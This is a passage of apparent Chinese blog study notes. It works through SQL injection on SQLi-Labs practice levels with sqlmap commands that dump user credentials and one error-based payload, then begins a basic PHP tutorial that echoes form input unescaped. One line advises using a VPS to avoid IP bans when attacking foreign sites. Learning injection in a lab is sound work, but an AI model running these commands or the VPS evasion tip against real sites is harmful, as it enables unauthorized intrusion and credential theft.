title="less-5"></a>less-5</h4><p>对于less-5不报出位置的情况</p><p>思路：利用报错注入，没有显示的地方不代表没有漏洞，如何发现漏洞和利用漏洞是sql的一个重点，less-5有报错，因此想办法利用报错信息实现隐性的表达。</p><p>havij中database可选择mysql error based，意思是使用隐性报错。</p><p><em>（报错注入是高级课程中的一个难点）要学会手工报错注入</em></p><h4 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h4><p>less-8连报错的信息都没有，这种就利用页面”有“和”没有“变化来注入</p><p>这叫布尔型盲注，havij选用blind盲注，其实手工猜着注入最后也需要写成程序，原理类似于：如果数据库的第一个字母是a-z字母之间就显示，否则不显示，借助二分法；</p><p>这个手工注入技能学会后需要达到两分钟内成功的标准</p><p>一般盲注和时间型盲注（less-9）是实战中用的比较多的</p><h4 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h4><p>时间型盲注</p><p>less-9设计有点问题，应该是不管怎么样界面都是you are in不变</p><p>这里所谓的时间，就是如果注入猜中了，可设置计算机sleep2秒，通过返回页面的时间来判断是否猜中字符串中的某位字符</p><p>这里使用havij，虽然mysql time based就行不通了</p><h2 id="sqlmap-使用"><a href="#sqlmap-使用" class="headerlink" title="sqlmap 使用"></a>sqlmap 使用</h2><p>sql注入神器</p><p>python编辑，人手一份，可扩展，电影中的感觉，开源，懂python可改造，变形金刚可替换装备，将防火墙弱点添加进去的话。</p><p>主角还是用sqlmap</p><p>不推荐使用win版本，建议使用kali的</p><p>搞国外的站最好还是用vps，否则自家ip分分钟会被封掉</p><p><strong>sqlmap参数详解</strong></p><p><a href="https://www.cnblogs.com/Sylon/p/11747464.html">https://www.cnblogs.com/Sylon/p/11747464.html</a></p><h4 id="SQLi-Lab"><a href="#SQLi-Lab" class="headerlink" title="SQLi-Lab"></a>SQLi-Lab</h4><p><a href="https://xz.aliyun.com/t/385">https://xz.aliyun.com/t/385</a></p><p><strong>sqlmap标准用法与四大标准注入体系</strong></p><h4 id="less-1标准注入"><a href="#less-1标准注入" class="headerlink" title="less-1标准注入"></a><strong>less-1标准注入</strong></h4><ul><li>前提，确定目标网站还是有漏洞的</li><li>建议使用Linux版的sqlmap</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [目标url] --dbs  获取目标url的数据库名</span><br><span class="line">返回结果：目标数据库可能是mysql，询问是否跳过其他可能数据库测试，n可以多测一些</span><br><span class="line">返回结果：想要包含所有的<span class="built_in">test</span>方法测试数据库吗？风险级别为1</span><br><span class="line"></span><br><span class="line">发现security库</span><br><span class="line">sqlmap -u [目标url] -D security --tables</span><br><span class="line">获取库里的表</span><br><span class="line"></span><br><span class="line">发现users表的列</span><br><span class="line">sqlmap -u [目标url] -D security -T users --columns</span><br><span class="line">发现id username password</span><br><span class="line"></span><br><span class="line">找到id username password 内容</span><br><span class="line">sqlmap -u [目标url] -D security -T users -C username,password --dump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">完整版命令：</span><br><span class="line">sqlmap -u [目标url] --dbs --batch --threads 10 --technique U</span><br><span class="line">使用sqlmap的10线程，忽略错误，使用union select注入网站</span><br><span class="line">（建议平时写命令使用完整版，更加严谨）（发现这里win版本的sqlmap 参数U不行，E可以）（kali的2014版本上的可以） 这里目标的--dbs要放在靠前参数位置</span><br><span class="line"></span><br><span class="line">奇怪的是less-4，kali上的居然搞不定</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT 1136 FROM (SELECT COUNT (*), CONCAT (0x3a616a743a, (SELECT (CASE WHEN (1136=1136) THEN 1 ELSE 0 END)), 0x3a6168633a, FLOOR( RAND(0)*2))xFROM INFORMATION_ SCHEMA.CHARACTER_ SETS GROUP BY x)a) AND &#x27;</span>FkES<span class="string">&#x27;=&#x27;</span>FkES</span><br></pre></td></tr></table></figure><p>可以在mysql执行的时候看看它都在干嘛,但是这条自己运行是会报语法错误，sqlmap却没有。。。这段代码得分析是什么意思：</p><h4 id="less-5盲注"><a href="#less-5盲注" class="headerlink" title="less-5盲注"></a><strong>less-5盲注</strong></h4><ul><li><p>原理：无法发现报错位，但是<strong>数据库错了会显示出来</strong></p></li><li><p>使用sqlmap对less-5<strong>的报错注入进行操作</strong></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://sqlilabs.njhack.xyz/less-5/index.php?id=1 --current-db --batch(忽略错误) --threads 10 --technique E (基于error报错注入)</span><br><span class="line"></span><br><span class="line">显示数据库名，表示成功</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tips: 通常情况下，or和and在注入的时候影响不算很大，两者区别一般在于盲注。很多时候防火墙拦截过滤了and的时候or可能没有，那就可以用or来进行盲注，节省绕过的时间。又或者用xor（异或）绕过防火墙，异或在这不作过多阐述，因为不在本次范围之内。</p><p>less-6 kali搞不定risk1</p><h4 id="less-8布尔注入"><a href="#less-8布尔注入" class="headerlink" title="less-8布尔注入"></a><strong>less-8布尔注入</strong></h4><ul><li><p>less1-4是报错+显示，less5是报错不显示，less8是没有报错也没有显示</p></li><li><p>less-8是布尔型注入，无法发现报错位，数据库被破坏也无法爆出来错，页面上只会出现有何没东西两种情况。</p></li><li><p>布尔型注入：booled based 和时间型注入实战中用的比较广</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql -u [目标url] --current-db --batch --threads 10 --technique B</span><br><span class="line"></span><br><span class="line">sql -u [目标url] -D security --tables --batch --threads 10 --technique B</span><br></pre></td></tr></table></figure><ul><li>布尔型注入需要猜，所以比较慢一点，也是用二分法猜测名字</li></ul><h4 id="less-9时间注入"><a href="#less-9时间注入" class="headerlink" title="less-9时间注入"></a><strong>less-9时间注入</strong></h4><ul><li><p>无法发现报错位，数据库被破坏也无法爆出来，界面上也没有出现或者消失东西的现象</p></li><li><p>很多时候网页没反应，但实际上与数据库是有互动的。</p></li><li><p>时间盲注：time based 耗时比较长，但往往是最有效果的，原理：如果某位是a的话就等两秒，如果是b的话就眨眨眼</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql -u [目标url] --current-db --batch --threads 10 --technique T (-v 3)有时候需要对等级进行调整，可调可不调这里</span><br></pre></td></tr></table></figure><hr><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><h4 id="less-11对post注入"><a href="#less-11对post注入" class="headerlink" title="less-11对post注入"></a><strong>less-11对post注入</strong></h4><p><strong>猜写法</strong></p><p>一个登录界面，查看页面源代码，发现有:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:15px;height:20px;&quot;</span>&gt;</span></span><br><span class="line">       Username:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:15px;height:20px;&quot;</span>&gt;</span></span><br><span class="line">       password:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    ……</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>根据经验</strong>结合页面代码猜测程序员后端是这样写的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; limit 0,1&quot;</span></span><br></pre></td></tr></table></figure><p><strong>打开burpsuit对其流量进行分析</strong></p><p>抓post包，send to repeater，通过修改post包中的post信息模拟提交，右边窗口预览，可以得到返回报错，得到闭合方式，直接在bp中渗透</p><p>在sqlmap中注入方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [目标url，后面不要跟?id=2了,url中是get方式] --data <span class="string">&quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot;</span>(这部分是抓到的post包中post的数据，*星号标在哪里sqlmap就打哪里) --current-db --batch --threads 10 --technique E</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>思考：为什么在uname的admin后面闭合，为什么不在passwd后面的位置闭合，哪里合适一些？怎么手动注入？因为加密？</li></ul><h3 id="less-18搜集用户信息"><a href="#less-18搜集用户信息" class="headerlink" title="less-18搜集用户信息"></a>less-18搜集用户信息</h3><p>有的网站可能会搜集用户浏览器信息，ip地址等</p><hr><p>插播搜集信息</p><blockquote><p>121.229.217.126</p><p>console.c** 芯片图标</p><p>1015635  蓝线鸽子F图标</p><p>anonymous file up  西装图标</p><p>virustotal</p><p>voice mesajlar  绿色电话图标</p><p>购物站123  y图标</p><p>av岛国小电影…  w图标</p><p>google cloud …芯片图标</p><p><a href="http://www.weiweisj.com/">www.weiweisj.com</a> av岛国小电影在线观看_日本阿v免费观看视2018…</p><p><a href="http://www.kexuefq.xyz/">www.kexuefq.xyz</a>   smart-tech  这里都是你要的</p></blockquote><hr><p>这类网站是通过请求头来收集信息，request-head，这类网站会把cookie信息保留在数据库中。</p><p>所以，这种注入方式注入点就在请求头里。一旦可以与数据库互动就可能发现漏洞。</p><p><strong>请求头注入</strong></p><p>user-agent(浏览器信息）；iphone？大数据杀熟，ip地址，大概在哪个小区？这个小区价位？都是年轻人？都喜欢什么？是否有什么规律？推测个人喜好</p><p>referer（来路）：从抖音来的?优惠券来的？这个用到的概率很高。</p><p>cookie</p><p>在send to repeater之后，可以在左边的user-agent处修改信息，加单引号尝试报错注入，发现闭合方式是单引号。</p><h4 id="sqlmap注入请求头"><a href="#sqlmap注入请求头" class="headerlink" title="sqlmap注入请求头"></a>sqlmap注入请求头</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [url] --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*&quot;</span>(在信息后面位置加*，注入点) --level 4(level不同，效果不一样，高级课程) --dbs --threads 10 --batch --technique E  （这里用win版本的sqlmap失败了，视频中因为太慢也没出来）（kali也没搞出来）</span><br></pre></td></tr></table></figure><ul><li>使用请求头注入时，–level必须大于3</li></ul><h3 id="less-20对cookie注入"><a href="#less-20对cookie注入" class="headerlink" title="less-20对cookie注入"></a>less-20对cookie注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [url] --cookie=<span class="string">&quot;uname=admin*;  choauhsduhauhska&quot;</span>(在uname的admin后面注入) --level 4 --dbs --threads 10 --batch --technique E</span><br></pre></td></tr></table></figure><p>任务：</p><ul><li>学完php，参考手册当字典用</li><li>开始学runoob的mysql</li><li>对工具可以有个研究，github开源sqlmap</li><li>多练</li></ul><hr><h2 id="SQLi手注"><a href="#SQLi手注" class="headerlink" title="SQLi手注"></a>SQLi手注</h2><p>先知天书：<a href="https://xz.aliyun.com/t/385">https://xz.aliyun.com/t/385</a></p><p>待更新</p><hr><p>​                                                                                                                                                                                                                                                                       </p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习笔记</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="php基础教程"><a href="#php基础教程" class="headerlink" title="php基础教程"></a>php基础教程</h1><p>PHP 是服务器端脚本语言，弱类型语言，c++中int，string属于强类型，php中使用$声明变量</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h3><ul><li>PHP（全称：PHP：<strong>Hypertext Preprocessor</strong>，即”PHP：<strong>超文本预处理器</strong>“）是一种<strong>通用开源脚本语言</strong>。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li></ul><h3 id="PHP-文件是什么？"><a href="#PHP-文件是什么？" class="headerlink" title="PHP 文件是什么？"></a>PHP 文件是什么？</h3><ul><li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</li><li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</li><li>PHP 文件的默认文件扩展名是 “.php”</li></ul><h3 id="PHP-能做什么？"><a href="#PHP-能做什么？" class="headerlink" title="PHP 能做什么？"></a>PHP 能做什么？</h3><ul><li>PHP 可以生成动态页面内容</li><li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li><li>PHP 可以收集表单数据</li><li>PHP 可以发送和接收 cookies</li><li>PHP 可以添加、删除、修改您的数据库中的数据</li><li>PHP 可以限制用户访问您的网站上的一些页面</li><li>PHP 可以加密数据</li></ul><p>通过 PHP，不再限于输出 HTML。可以输出图像、PDF 文件，甚至 Flash 电影。还可以输出任意的文本，比如 XHTML 和 XML。</p><h3 id="为什么使用-PHP？"><a href="#为什么使用-PHP？" class="headerlink" title="为什么使用 PHP？"></a>为什么使用 PHP？</h3><ul><li>PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）</li><li>PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）</li><li>PHP 提供了广泛的数据库支持</li><li>PHP 是免费的，可从官方的 PHP 资源下载它：<a href="http://www.php.net/">   www.php.net</a></li><li>PHP 易于学习，并可高效地运行在服务器端</li></ul><h2 id="php语法"><a href="#php语法" class="headerlink" title="php语法"></a>php语法</h2><p>基础语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">index.xxx  index是标准的网页首页命名</span><br><span class="line">index.htmlindex.phpindex.jsp.asp.htm</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;haha nihao&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">代码必须用<span class="meta">&lt;?php</span> XXXXXXXXXXX <span class="meta">?&gt;</span>包裹起来</span><br><span class="line"><span class="keyword">echo</span>输出</span><br><span class="line"></span><br><span class="line">变量：</span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span> ;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">999</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;nihao&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment">//这里的点叫粘合</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="php5-echo-amp-print"><a href="#php5-echo-amp-print" class="headerlink" title="php5 echo &amp; print"></a>php5 echo &amp; print</h2><ul><li>区别，echo可输出一个或多个字符串，print只能输出一个字符串，返回值总为1</li><li>echo输出速度比print快，没有返回值</li><li>echo 或 echo()这两个写法都可以</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;</span>;  <span class="comment">//php脚本这里直接将结果输给html上</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello world!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我要学 PHP!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;这是一个&quot;</span>, <span class="string">&quot;字符串，&quot;</span>, <span class="string">&quot;使用了&quot;</span>, <span class="string">&quot;多个&quot;</span>, <span class="string">&quot;参数。&quot;</span>;</span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">#输出html标签</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我车的品牌是 <span class="subst">&#123;$cars[0]&#125;</span>&quot;</span>; <span class="comment">//用&#123;&#125;包裹，变量数组，索引下标</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">PHP 很有趣!</span><br><span class="line">Hello world!</span><br><span class="line">我要学 PHP!</span><br><span class="line">这是一个字符串，使用了多个参数。</span><br><span class="line">我车的品牌是Volvo</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="@"></a>@</h2><p>@ 在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$ php_errormsg中。每个错误都会覆盖此变量。</p><h1 id="php表单"><a href="#php表单" class="headerlink" title="php表单"></a>php表单</h1><h2 id="php表单-1"><a href="#php表单-1" class="headerlink" title="php表单"></a>php表单</h2><ul><li><p><strong>$_GET</strong> </p></li><li><p><strong>$_POST</strong> </p></li><li><p>这两个内置变量用于检索表单中的信息，比如用户输入。当处理 HTML 表单时，PHP 能把来自 HTML 页面中的表单元素<strong>自动变成</strong>可供 PHP 脚本使用。</p></li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>form.html 文件代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>表单html<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;welcome.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span>&gt;</span></span><br><span class="line">        年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当用户填写完上面的表单并点击提交按钮时，表单的数据会被送往名为 “welcome.php” 的 PHP 文件：</p><p>welcome.php 文件代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎&lt;?php echo $_POST[&quot;fname&quot;]; ?&gt;!&lt;br&gt;</span><br><span class="line">你的年龄是 &lt;?php echo $_POST[&quot;age&quot;]; ?&gt;  岁。</span><br></pre></td></tr></table></figure><h2 id="php与get，post"><a href="#php与get，post" class="headerlink" title="php与get，post"></a>php与get，post</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;namee&#x27;</span>]</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;----&quot;</span>.<span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一般在url中的是get方法，post多用来用户名密码注册，登录，get常用来取东西</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210713180258956.png" alt="image-20210713180258956"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">18</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;chengnian&#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wei cheng nian&#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210713180310312.png" alt="image-20210713180310312"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210713180320507.png" alt="image-20210713180320507"></p><p>火狐浏览器强行给的post请求，get才能在url中使用</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210713180334211.png" alt="image-20210713180334211"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210713180351433.png" alt="image-20210713180351433"></p><h2 id="php-html"><a href="#php-html" class="headerlink" title="php+html"></a>php+html</h2><p>php是脚本语言，可以插入在html中生成HTML标签，这点与js相似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $servername &#x3D; &quot;localhost&quot;; &#x2F;&#x2F;大部分公司的代码与数据库不在一起，所以一般这里先写个远程连接的ip地址</span><br><span class="line">    $username&#x3D;&quot;root&quot;;</span><br><span class="line">    $password&#x3D;&quot;root&quot;;</span><br><span class="line">    $dbname&#x3D;&quot;haha&quot;;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;创建连接</span><br><span class="line">    $conn &#x3D; new mysqli($servername,$username,$password,$dbname);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;检测连接</span><br><span class="line">    if($conn-&gt;connect_error)&#123;</span><br><span class="line">        die(&quot;连接失败：&quot;.$conn-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;数据库查语句</span><br><span class="line">    $sql &#x3D; &quot;SELECT * FROM table1 WHERE id &lt; 12 &quot;;</span><br><span class="line">    $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    if($result-&gt;num_rows&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;结合html表格输出数据</span><br><span class="line">        echo &quot;&lt;table border&#x3D;&#39;1&#39;&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;tr&gt; &lt;th&gt;id&lt;th&gt; &lt;th&gt;username&lt;th&gt; &lt;th&gt;password&lt;th&gt;&lt;&#x2F;tr&gt;&quot;;</span><br><span class="line">        while($row&#x3D;$result-&gt;fetch_assoc())</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&quot;.$row[&#39;id&#39;].&quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo 